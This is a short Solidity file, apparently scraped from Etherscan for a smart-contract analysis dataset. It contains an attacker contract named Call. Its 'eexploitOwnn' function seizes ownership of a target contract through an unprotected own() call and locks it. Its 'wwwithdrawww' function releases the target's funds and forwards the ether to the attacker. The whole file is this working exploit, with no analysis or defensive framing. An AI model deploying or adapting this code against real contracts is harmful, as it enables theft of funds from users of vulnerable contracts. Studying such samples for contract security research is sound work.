/**********************************************************************
*These solidity codes have been obtained from Etherscan for extracting
*the smartcontract related info.
*The data will be used by MATRIX AI team as the reference basis for
*MATRIX model analysis,extraction of contract semantics,
*as well as AI based data analysis, etc.
**********************************************************************/
pragma solidity ^0.4.24;
contract HelloEx{

	function own(address owner) {}

	function releaseFunds(uint amount) {}

	function lock() {}
}

contract Call{

	address owner;

	HelloEx contr;

	constructor() public
	{
		owner = msg.sender;
	}

	function setMyContractt(address addr) public
	{
		require(owner==msg.sender);
		contr = HelloEx(addr);
	}

	function eexploitOwnn() payable public
	{
		require(owner==msg.sender);
		contr.own(address(this));
		contr.lock();
	}

	function wwwithdrawww(uint amount) public
	{
		require(owner==msg.sender);
		contr.releaseFunds(amount);
		msg.sender.transfer(amount * (1 ether));
	}

	function () payable public
	{}
}